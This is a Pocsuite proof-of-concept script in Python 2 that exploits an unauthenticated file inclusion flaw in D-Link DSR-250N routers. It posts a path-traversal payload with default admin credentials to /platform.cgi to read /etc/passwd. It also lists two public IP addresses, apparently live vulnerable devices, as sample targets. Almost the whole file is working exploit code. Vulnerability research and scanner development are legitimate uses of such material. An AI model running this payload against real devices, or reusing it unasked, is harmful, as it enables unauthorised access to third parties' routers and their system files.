#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import httplib
import urlparse


class TestPOC(POCBase):
    vulID = '90225'  # ssvid
    version = '1.0'
    author = ['Magic']
    vulDate = '2015-06-09'
    createDate = '2016-05-31'
    updateDate = '2016-05-31'
    references = ['http://www.wooyun.org/bugs/wooyun-2016-0181869']
    name = 'D-Llink某处无需登录文件包含'
    appPowerLink = 'http://www.dlink.com.cn'
    appName = 'D-Link'
    appVersion = 'DSR-250N'
    vulType = 'File Inclusion'
    desc = '''   
    D-Link File Inclusion
    '''
    samples = ['http://176.62.84.70:8080/','http://178.237.184.210:8080/']

    def _attack(self):
        return self._verify()

    def _verify(self):
        httpClient = None
        result = {}
        result['VerifyInfo'] = {}
        arr = urlparse.urlparse(self.url)
        target = arr.hostname
        port = arr.port
        if not port:
            port = 8080
        try:
            payload = 'thispage=../../../../../../../../../../etc/passwd%00.htm&Users.UserName=admin%2F*&Users.Password=admin&button.login.Users.deviceStatus=Login&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F48.0.2564.116+Safari%2F537.36'
            headers = {'Origin': 'http://127.0.0.1:8080', 'Content-Length': '287', 'Accept-Language': 'zh-CN,zh;q=0.8', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Upgrade-Insecure-Requests': '1', 'Host': '176.62.84.70', 'Referer': 'http://127.0.0.1:8080/', 'Cache-Control': 'max-age=0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded'}

            httpClient = httplib.HTTPConnection(target, port)
            httpClient.request('POST', '/platform.cgi', payload, headers=headers)
            res = httpClient.getresponse()

            if res.status == 200 and '/bin/sh' in res.msg:
                result['VerifyInfo']['URL'] = self.url
            return self.parse_attack(result)
        except Exception, e:
            raise e
        finally:
            if httpClient:
                httpClient.close()

    def parse_attack(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)